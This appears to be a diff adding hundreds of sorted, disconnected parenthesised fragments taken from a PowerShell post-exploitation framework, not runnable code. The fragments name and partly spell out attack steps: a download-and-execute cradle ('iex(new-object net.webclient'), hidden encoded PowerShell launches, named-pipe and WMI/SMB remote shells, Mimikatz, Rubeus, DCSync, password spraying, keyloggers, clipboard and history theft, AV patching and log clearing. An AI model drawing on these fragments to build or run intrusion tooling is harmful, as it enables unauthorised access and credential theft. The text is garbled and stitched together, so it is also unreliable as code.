@@ -1,0 +1,669 @@
+"("" Choose an option or session number, or type 'exit' to quit """
+"("" Choose an option or type 'exit' to quit """
+"("""""
+"(""""#END#"""""
+"(""""$ComputerName"""",""""$PipeName"""",'InOut'"
+"(""""`$([System.Net.Dns]::GetHostByName((`$env:computerName"
+"(""###END###"""
+"(""#END#"""
+"(""$Computer"", $PipeName, 'InOut'"
+"(""$ComputerName"", ""$PipeName"", 'InOut'"
+"(""$ComputerName"", $PipeName, 'InOut'"
+"(""$FinalCommand"""
+"(""$InjectCommand"""
+"(""$PipeName"", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null"
+"(""$Target"", $PipeName, 'InOut'"
+"(""$baseFileNameWithoutExtension($counter"
+"(""$cmd"""
+"(""$finalstring"""
+"(""$predefinedCommands"""
+"(""$rawCommand"""
+"(""192.168."""
+"(""Clipboard"", ""Downloads"", ""History"", ""Keylogger"", ""Payloads"", ""Screenshots"", ""Scripts"", ""Monitor_TGTs"""
+"(""CommandStatus"", [System.Management.CimType]::String, $false"
+"(""Connection: close"""
+"(""Content-Length: "" + content.Length"
+"(""Find-LocalAdminAccess -Method SMB -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method SMB -Command `""$finalstring`"" -NoOutput"""
+"(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput"""
+"(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method SMB -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput"""
+"(""Find-LocalAdminAccess -Method WMI -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method WMI -Command `""$finalstring`"" -NoOutput -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Command `""$finalstring`"" -NoOutput"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -Command `""$finalstring`"" -NoOutput"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput -Targets $userdeftargets"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput -UserName $userdefusername -Password $userdefpassword"""
+"(""Find-LocalAdminAccess -Method WMI -Domain $userdefdomain -DomainController $userdefdc -Command `""$finalstring`"" -NoOutput"""
+"(""Get-Clipboard"""
+"(""HTTP/1.1 200 OK"""
+"(""HTTP/1.1 404 Not Found"""
+"(""Invoke-SMBRemoting -ComputerName `""$Target`"" -Command `""$Command`"""""
+"(""Invoke-WMIRemoting -ComputerName `""$Target`"" -Command `""$Command`"""""
+"(""Key"", $true"
+"(""Listening on "" + Listener.LocalEndpoint"
+"(""OutputData"", [System.Management.CimType]::String, $false"
+"(""Start-Sleep -Seconds 10;sc.exe delete $serviceToDelete;Stop-Process -Id `$pid -Force"""
+"(""System.Core.dll"""
+"(""System.dll"""
+"(""Write-Output $PN"""
+"(""Write-Output $SyncString"""
+"(""[$ComputerName]: PS:\>"""
+"(""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('$historyFile'"
+"(""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(`""`$pwd\$remotefileName`"""
+"(""\\$ComputerName\root\cimv2"", $connectionOptions"
+"(""\\$ComputerName\root\cimv2"", [string]::Empty, $null"
+"(""`"""", ""`\`"""""
+"(""`$Find = @("
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$Find = Find-LocalAdminAccess -Method PSRemoting;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'"
+"(""`$ShCodePlaceholder = `""$ShCodePlaceholder`"""""
+"(""`$env:COMPUTERNAME,`$(Get-Location"
+"(""`$job = Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob"""
+"(""`$job | Wait-Job;`$job | Remove-Job"""
+"(""`$trimmedShCodePlaceholder = `$ShCodePlaceholder.Trim("
+"(""exit"""
+"(""iex(new-object net.webclient"
+"(""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64"
+"(""prompt | Out-String"""
+"(""try{type c:\Users\Public\Documents\$ConstructFileName | Out-String -Width 4096}catch{}#"""
+"(""try{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096}catch{}#"""
+"(""whoami"""
+"($ADCompDomain -replace ""\."", "",DC="""
+"($Command -eq ""AV"""
+"($Command -eq ""AutoMimi"""
+"($Command -eq ""ClearHistory"""
+"($Command -eq ""ClearLogs"""
+"($Command -eq ""CredMan"""
+"($Command -eq ""Dpapi"""
+"($Command -eq ""HashGrab"""
+"($Command -eq ""Hive"""
+"($Command -eq ""Kerb"""
+"($Command -eq ""Keylog"""
+"($Command -eq ""Mimi"""
+"($Command -eq ""Monitor"""
+"($Command -eq ""MonitorClear"""
+"($Command -eq ""MonitorRead"""
+"($Command -eq ""Net"""
+"($Command -eq ""PInject"""
+"($Command -eq ""Patch"""
+"($Command -eq ""PatchNet"""
+"($Command -eq ""PowerView"""
+"($Command -eq ""Process"""
+"($Command -eq ""RDPKeylog"""
+"($Command -eq ""Remoting"""
+"($Command -eq ""Rubeus"""
+"($Command -eq ""Services"""
+"($Command -eq ""Sessions"""
+"($Command -eq ""Software"""
+"($Command -eq ""Startup"""
+"($Command -eq ""TLS"""
+"($Command -eq ""screen4K"""
+"($Command -eq ""screenshot"""
+"($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript"
+"($Computer, $Command, $WmiScript"
+"($Computer, $PipeName"
+"($Domain -replace '\.',',DC='"
+"($KeyID, [System.Management.CimType]::String, $false"
+"($Method -eq ""PSRemoting"""
+"($Method -eq ""SMB"""
+"($Method -eq ""WMI"""
+"($Port, $Path"
+"($TrustAttributes -join ', '"
+"($UserName -AND $Password -AND ($Method -eq ""PSRemoting"""
+"($UserName -AND $Password -AND ($Method -eq ""WMI"""
+"($UserName, $SecPassword"
+"($UserName,$SecPassword"
+"($_ -split ""\s+"""
+"($_.IPAddress.StartsWith(""10."""
+"($baseFileName + ""($counter"
+"($bytesToCompress, 0, $bytesToCompress.Length"
+"($choice -like ""RepoURL*"""
+"($choice -like ""Serve*"""
+"($command -eq ""GetSystem"""
+"($command -eq ""KeylogRead"""
+"($command -eq ""LocalAdminAccess"""
+"($command -eq ""OneIsNone"""
+"($command -eq ""RDPKeylogRead"""
+"($command -eq ""SessionHunter"""
+"($command -eq ""exit"""
+"($command -eq ""sync"""
+"($command -like ""Download *"""
+"($command -like ""Kerb"" -OR $command -like ""Invoke-PassSpray*"" -OR $command -like ""DCSync"" -OR $command -like ""Access_Check*"" -OR $command -like ""Find-LocalAdminAccess*"" -OR $command -like ""Invoke-SessionHunter*"" -OR $command -like ""AutoMimi*"" -OR $command -like ""Mimi*"""
+"($command -like ""Migrate *"" -OR $command -like ""Migrate2 *"""
+"($command -like ""Migrate *"""
+"($command -like ""Migrate2 *"""
+"($command -like ""PInject *"""
+"($command -like ""ShellGen *"""
+"($command -like ""Upload *"""
+"($command -like ""WMIRemoting *"""
+"($command -like ""help"""
+"($command -like ""shell_psadmin*"""
+"($command -like ""shell_smbadmin*"""
+"($command -like ""shell_tknadmin*"""
+"($command -like ""shell_wmiadmin*"""
+"($command -ne """""
+"($commandParts -icontains ""-Domain"""
+"($commandParts -icontains ""-DomainController"""
+"($commandParts -icontains ""-Password"""
+"($commandParts -icontains ""-Targets"""
+"($commandParts -icontains ""-UserName"""
+"($commandParts, ""-Domain"", [System.StringComparison]::CurrentCultureIgnoreCase"
+"($commandParts, ""-DomainController"", [System.StringComparison]::CurrentCultureIgnoreCase"
+"($commandParts, ""-Password"", [System.StringComparison]::CurrentCultureIgnoreCase"
+"($commandParts, ""-Targets"", [System.StringComparison]::CurrentCultureIgnoreCase"
+"($commandParts, ""-UserName"", [System.StringComparison]::CurrentCultureIgnoreCase"
+"($computer, $Port"
+"($computer, $Port, $null, $null"
+"($computer, $port"
+"($computer, $port, $null, $null"
+"($computer, 445, $null, $null"
+"($everyone, ""FullControl"", ""Allow"""
+"($false, 'SCMutex'"
+"($fileName, $ClipboardContent"
+"($fileName, $KeylogContent"
+"($fileName, [Convert]::FromBase64String($fileContentBase64"
+"($global:bookmarks | Sort-Object { [int]([regex]::Match($_.DisplayName, '(?<=\["
+"($i, [Math]::Min($size, $command.Length - $i"
+"($identifier, $newIndex"
+"($line -eq ""###END###"""
+"($line -eq ""#END#"""
+"($line -eq ""$PN"""
+"($line -eq ""$SyncString"""
+"($line -like ""*not running*"" -OR $line -like ""*Failed to write*"""
+"($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png"
+"($memoryStream, [System.IO.Compression.CompressionMode]::Compress"
+"($params, $translate"
+"($pipeName, 'InOut', 1, 'Byte', 'None', 1028, 1028, $securityDescriptor"
+"($result.Properties[""trustattributes""][0] -band $key"
+"($result.Properties[""trustdirection""][0]"
+"($result.Properties[""trusttype""][0]"
+"($scope, [System.Management.ManagementPath]::new("
+"($serverOutput -like ""*Empty Registry*"""
+"($shellcode | foreach-object { ""$($_.ToString(""X2"""
+"($sr, $sw"
+"($totalWidth, $totalHeight"
+"($url, $destinationFolder"
+"($url, $destinationPath"
+"($userCommand -eq ""exit"""
+"($userCommand -ne """""
+"($userdefusername,`$SecPassword"
+"($whoamiInfo -eq """""
+"($wmiDataOutput.CommandStatus -eq ""Completed"""
+"(' ', 2"
+"(' ',''"
+"('$ComputerName','$PipeName','InOut'"
+"('$PN', 'InOut', 1, 'Byte', 'None', 1028, 1028, `$securityDescriptor"
+"('$PN','InOut',1,'Byte','None',1028,1028,`$sD"
+"('$PN','InOut',1,'Byte','None',1028,1028,`$sd"
+"('$UserPath\$remoteFileName', [Convert]::FromBase64String('$fileContentBase64'"
+"('$usersDirectory = ""C:\Users"";$userDirs = Get-ChildItem -Path $usersDirectory -Directory;$userDirs.Name'"
+"('2>&1 ', '2^^^>^^^&1 ^^^'"
+"('Domain', $AllDomain"
+"('Domain', $ParentDomain"
+"('Write-Output ""[+] Keylogger started with PID $($processId.Trim("
+"('Write-Output ""[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0"";Write-Output """";Write-Output ""[+] RDP Keylogger started with PID $($processId.Trim("
+"('Write-Output ""[+] TGT_Monitor started with PID $($processId.Trim("
+"(($command -like ""SMBRemoting *"""
+"(),$_.PipeName.ToString("
+"(),$_.UniquePipeID.ToString("
+"().Split(','"
+"();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite"
+"();if(`$c-eq """"exit"""""
+"();if(`$c-eq`""exit`"""
+"();if(`$cmd-eq""""exit"""""
+"()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite"
+"(,[Convert]::FROmbAsE64StRiNg(`$gz"
+"(0, 0, 0, 0, $bitmap.Size"
+"(1, 10"
+"(1, [Environment]::ProcessorCount"
+"(1, [System.Environment]::ProcessorCount"
+"(@(""name"", ""trustPartner"", ""trustDirection"", ""trustType"", ""trustAttributes"", ""whenCreated"", ""whenChanged"""
+"(IPAddress address, int port"
+"([IPAddress]::Any, $Port"
+"([wmiclass]""\\$ComputerName\ROOT\CIMV2:$ClassID"""
+"(\.\d{1,3}"
+"(`""#END#`"""
+"(`"".`"", `""$pipeName`"", 'InOut'"
+"(`""dummyhostdropconnection,`$(Get-Location"
+"(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs"
+"(`$command -eq ""exit"""
+"(`$sU,""""FullControl"""",""""Allow"""""
+"(`$singleuser, ""FullControl"", ""Allow"""
+"(`$user,`""FullControl`"",`""Allow`"""
+"(address, port"
+"(content, 0, content.Length"
+"(rootDirectory, url.Replace(""/"", ""\\"""
+"(tokens[0] == ""GET"""
+"(url == ""/"""
+(!$ComputerAccess
+(!$FindCurrentDomain
+(!$GlobalPipeName
+(!$HidePayload
+(!$NoOutput
+(!$NoWait
+(!$Path
+(!$PipeName
+(!$Port
+(!$ScanMode
+(!$ServiceName
+(!$ShowErrors
+(!$SinglePipeName
+(!$SkipPortScan
+(!$global:AllOurTargets
+(!$global:AllUserDefinedTargets
+(!$global:RestoreTimeout
+(!$pipeClient.IsConnected
+(!$userdefPort
+(!(Test-Path -Path $destinationPath
+(!(userAccountControl:1.2.840.113556.1.4.803:=2
+($ADCompDomain
+($Admin
+($AllDomain in $AllDomains
+($CheckTargets
+($ChildContext | Select-Object -ExpandProperty Children | Select-Object -ExpandProperty Name
+($ChildDomain in $ChildDomains
+($ChildDomains
+($ClipboardContent
+($Command
+($Computer
+($Computer in $ComputerAccess
+($Computer in $Computers
+($Computer in $FinalTargets
+($ComputerAccess
+($ComputerAccess | Out-String
+($ComputerName
+($ComputerName -match $ipPattern
+($DefineHostname
+($Detached
+($Detached -AND -not $IP
+($Domain -AND $DomainController
+($DomainContext
+($ExecuteExitCommand
+($ExitLoop -eq $True
+($FindCurrentDomain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
+($IP
+($IP in $PossibleIPAddresses
+($InLine
+($InjectOutput | Out-String
+($Isx64
+($Job in $JobObjects
+($Job.Handle
+($KeylogContent
+($LocalAdminAccessOutput | Out-String
+($Method
+($Method -eq 'PSRemoting'
+($Method -eq 'SMB'
+($Method -eq 'SMB' -AND $scsafe
+($Method -eq 'SMBRemoting'
+($Method -eq 'WMI'
+($Method -eq 'WMIRemoting'
+($Night
+($ParentDomain
+($Password
+($PipeClient
+($PipeClient -AND (-not $PipeClient.IsConnected
+($PipeName
+($PipeServer
+($PlaceHolder
+($Port
+($PortScan
+($PwshRawClientScript
+($PwshRawServerScript
+($ReachableResult
+($Result.ComputerName
+($Result.Error
+($Result.Output.TrimEnd(
+($SaveOutput
+($ScanMode -OR $global:ScanModer
+($Server
+($ShowBookmarks
+($ShowMenuCommands
+($ShowSessions
+($ShowUserDefinedTargets
+($SmbScript
+($Target
+($Targets
+($TempAdminAccessTargets
+($TempAdminAccessTargets.count
+($TempUsernameGrab | Out-String
+($TestPath
+($Timeout
+($TrustTargetName in $TrustTargetNames
+($UDT in $UserDefinedTargets
+($UserDefinedTargets
+($UserName
+($UserName -AND $Password
+($UserName -and $Password
+($Username
+($Verbose
+($WMI
+($WmiScript
+($_
+($_ -band 0xFF
+($_.DisplayUserID
+($accessRule
+($adminLines.Count -eq 0
+($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0
+($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0
+($allTargets
+($allTargets.count
+($allowedCommands -contains $command
+($arr
+($assemblyPath
+($asyncResult
+($baseFileName + $fileExtension
+($bitmap
+($bookmark
+($bookmark.DisplayName -split '\] '
+($bookmarkToRemove
+($bytes
+($choice
+($choice -eq ''
+($choice -eq 'Bookmarks'
+($choice -eq 'Find-LocalAdminAccess'
+($choice -eq 'exit'
+($choice -eq 'help'
+($choice -eq 'kill all'
+($choice -eq 'scramble'
+($choice -eq 'sessions'
+($choice -eq 'switch'
+($choice -eq 'targets'
+($choice -eq 'toggle'
+($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + $global:listenerSessions.Count + 5
+($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + 5
+($choice -is [int] -and $choice -ge 5 -and $choice -lt ($global:directAdminSessions.Count + 5
+($chunk in $chunks
+($chunks
+($chunks.Count -gt 1
+($cimInstance
+($cmd in $predefinedCommands
+($command
+($command -eq 'Ask4Creds'
+($command -eq 'Clipboard'
+($command -eq 'CredValidate'
+($command -eq 'DCSync'
+($command -eq 'GListener'
+($command -eq 'History'
+($command -eq 'Impersonation'
+($command -eq 'PassSpray'
+($command -eq 'scramble'
+($command -eq 'screen4K'
+($command -eq 'toggle'
+($command -like 'GLSet *'
+($command.Length -lt 7
+($command.Length -lt 8
+($commandParts[0] -eq 'GLSet' -and $commandParts[1]
+($commandParts[0] -eq 'bookmark' -and $commandParts[1] -match '^\d+$'
+($commandParts[0] -eq 'kill' -and $commandParts[1] -match '^\d+$'
+($commandParts[0] -eq 'targets' -and $commandParts[1]
+($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'check'
+($commandParts[0] -eq 'targets' -and $commandParts[1] -eq 'clear'
+($commandParts[0] -eq 'unbookmark' -and $commandParts[1] -match '^\d+$'
+($computer
+($computer in $Computers
+($computer in $reachable_hosts
+($computerNameOnly -eq 'dummyhostdropconnection'
+($computerNameOnly -match $ipPattern
+($cred
+($currentUrl
+($destinationFolder
+($elapsedTime -lt $timeout
+($error[0] -eq $null
+($filtered
+($fullCommand
+($gatherhostname | Out-String
+($global:AdminCheckProtocol -eq 'SMB'
+($global:AdminCheckProtocol -eq 'WMI'
+($global:Detach
+($global:FileServerProcess
+($global:Message
+($global:MultiPipeName
+($global:MultipleSessions | Sort-Object { $_.ComputerName.ToString(
+($global:MultipleSessions.Count -gt 0
+($global:MultipleSessions[$i].UniquePipeID -eq $selectedMultiSession.UniquePipeID
+($global:RestoreAllUserDefinedTargets -eq $True
+($global:RestoreOldMultiPipeName -eq $True
+($global:ServerURL
+($global:bookmarks
+($global:bookmarks.Count -gt 0
+($global:bookmarks[$i].Identifier -eq $identifierToRemove
+($global:directAdminSessions.Count + $global:listenerSessions.Count + $global:MultipleSessions.Count + 5
+($global:directAdminSessions.Count + $global:listenerSessions.Count + 5
+($global:directAdminSessions.Count -gt 0
+($global:listenerSessions | Sort-Object { $_.ComputerName.ToString(
+($global:listenerSessions.Count -gt 0
+($global:listenerSessions[$i].PipeName -eq $selectedSession.PipeName
+($global:localadminaccesspayload -eq 'PSRemoting'
+($global:localadminaccesspayload -eq 'SMB'
+($global:payloadformat -eq 'b64'
+($global:payloadformat -eq 'exe'
+($global:payloadformat -eq 'gzip'
+($global:payloadformat -eq 'pwraw'
+($global:payloadformat -eq 'pwsh'
+($global:payloadformat -eq 'raw'
+($gzipcompressedBytes
+($handle
+($handle.AsyncWaitHandle.WaitOne($timeoutSeconds * 1000
+($i = $global:MultipleSessions.Count - 1; $i -ge 0; $i--
+($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--
+($i = 0; $i -lt $global:MultipleSessions.Count; $i++
+($i = 0; $i -lt $global:bookmarks.Count; $i++
+($i = 0; $i -lt $global:listenerSessions.Count; $i++
+($i=0; $i -lt $host.UI.RawUI.WindowSize.Height; $i++
+($index
+($indexToRemove
+($indexToRemove + 5 + $global:directAdminSessions.Count
+($indexToRemove + 5 + $global:directAdminSessions.Count + $global:listenerSessions.Count
+($indexToRemove -ne -1
+($inputFromUser
+($inputFromUser -eq 'exit'
+($isAdmin
+($j
+($j = $global:bookmarks.Count - 1; $j -ge 0; $j--
+($key in $TrustAttributesMapping.Keys
+($ldapPath
+($line in $InjectOutput
+($line in $global:Message
+($listener in $global:listenerSessions
+($listenerMatch -or $multiListenerMatch
+($localFullPath
+($multilistener in $global:MultipleSessions
+($null -ne $identifierToRemove
+($null -ne $indexToRemove
+($oneLiner
+($pipeClient
+($pipeServer
+($pipeServer -AND (-not $pipeServer.IsConnected
+($pipeServer -and $pipeServer.IsConnected
+($processId.Trim(
+($promptString
+($remotefileName
+($result
+($result in $results
+($result.Computer
+($result.Message
+($result.Success
+($results
+($rootDirectory
+($run in $runspaces
+($run.Status
+($runspace in $runspaces
+($runspace.Computer
+($runspace.Handle
+($runspace.Status
+($scriptWithCommand
+($scsafe
+($selectedMultiSession.ComputerName
+($selectedMultiSession.PipeName
+($selectedSession.ComputerName
+($selectedSession.PipeName
+($serverOutput | Out-String
+($session
+($session in $global:directAdminSessions
+($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex
+($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex
+($sessionNumber -gt $listenerEndIndex
+($sessionNumber -gt $listenerEndIndex -and $sessionNumber -le $globalListenerEndIndex
+($sr
+($startProcess.ReturnValue
+($startProcess.ReturnValue -eq 0
+($startProcess.ReturnValue -ne 0
+($sw
+($target in $allTargets
+($true
+($uri.LocalPath
+($url in $urls
+($userDir in $TempUsernameGrab
+($userdefPath
+($userdefURL
+($userdefdomain -AND $userdefdc
+($userdefdomain -AND -not $userdefdc
+($userdeftargets
+($userdefusername -AND $userdefpassword
+($wait
+($wmiData | Select-Object -Property $KeyID -ExpandProperty $KeyID
+(&(sAMAccountType=805306369
+(' '
+('#END#'
+('$($global:ServerURL
+('$([System.Net.Dns]::GetHostByName(($env:computerName
+('$env:username'
+('$pwd | Select-Object -ExpandProperty Path'
+('/'
+('\'
+('\\'
+(($UserName -OR $Password
+(($command -eq 'screenshot'
+(($env:computerName
+(($global:directAdminSessions.Count -gt 0
+(($ourerror
+((65..90
+(([System.Text.Encoding]::UTF8.GetBytes($content
+().AddScript($ScriptBlock
+().AddScript($scriptBlock
+().DomainName.Trim(
+(); `$dummyPipeClient.Close(
+(); `$sw = New-Object System.IO.StreamWriter(`$dummyPipeClient
+();$base64String = [Convert]::ToBase64String($bytes
+();`$a.ClosE(
+();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.'
+();`$sr=New-Object System.IO.StreamReader(`$pS
+();`$sr=New-Object System.IO.StreamReader(`$ps
+();if(`$c-eq 'exit'
+();while(`$true
+()}`$p.Close(
+()}};`$pS.Disconnect(
+()}};`$ps.Disconnect(
+(-not $ComputerName
+(-not $Target
+(-not $classExists
+(-not ($global:directAdminSessions -contains $target
+(-not (Test-Path $basePath
+(-not (Test-Path $subfolderPath
+(-not (Test-Path -Path $destinationFolder
+(-not `$pS.IsConnected
+(-not `$pipeServer.IsConnected
+(-not `$process
+(-not `$ps.IsConnected
+(100
+(1[6-9]|2[0-9]|3[0-1]
+(50
+(600000
+(97..122
+(?=\]
+(@L3o4j
+(Encoding.UTF8.GetString(Convert.FromBase64String(script
+(File.Exists(path
+(FindDomainTrusts -Domain $AllDomain
+(Get-Location
+(Get-Random
+(Mandatory = $false
+(Mandatory = $true
+(Mandatory=$true
+(PSRemoting
+(SMB
+(Test-Path $fileName
+(Test-Path $localFullPath
+(WMI
+(WMI only
+([ScriptBlock]::Create($SmbScript
+([ScriptBlock]::Create($WmiScript
+([System.AppDomain]::CurrentDomain.GetAssemblies(
+([System.IO.File]::ReadAllBytes($localFullPath
+([System.Security.Principal.WindowsBuiltInRole]::Administrator
+([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent(
+([System.Text.Encoding]::Unicode.GetBytes($ClientScript
+([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit
+([System.Text.Encoding]::Unicode.GetBytes($CmdInput
+([System.Text.Encoding]::Unicode.GetBytes($FileServerMonitoringScript
+([System.Text.Encoding]::Unicode.GetBytes($ServerScript
+([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit
+([System.Text.Encoding]::Unicode.GetBytes($finalCommand
+([System.Text.Encoding]::Unicode.GetBytes($monitoringScript
+([System.Text.Encoding]::Unicode.GetBytes($psScript
+([System.Text.Encoding]::Unicode.GetBytes($rawCommand
+([array] $chunks
+([string] $command
+([string]$CmdInput
+([string]$ShCommand
+([string]$url
+([switch]$NoWait
+(`$?
+(`$HashGrab
+(`$_
+(`$_.TrimEnd(
+(`$aR
+(`$accessRule
+(`$ar
+(`$c
+(`$c.ToArray(
+(`$computersLine
+(`$env:USERNAME
+(`$errorMessage
+(`$p
+(`$pS
+(`$pipeClient
+(`$pipeServer
+(`$ps
+(`$state
+(`$true
+(b64
+(default: b64
+(e.g.: nt authority\system
+(for ($i = 0; $i -lt $command.Length; $i += $size
+(foreach($AllDomain in $AllDomains
+(hex
+(multiple targets
+(new-object net.webclient
+(objectClass=trustedDomain
+(path
+(raw
+(request
+(save to variable
+(single target
+(string rootDirectory
+(string[] args
+(text
+(true
+(var client = Listener.AcceptTcpClient(
+(var reader = new StreamReader(stream
+(var stream = client.GetStream(
+(var writer = new StreamWriter(stream
+(whoami
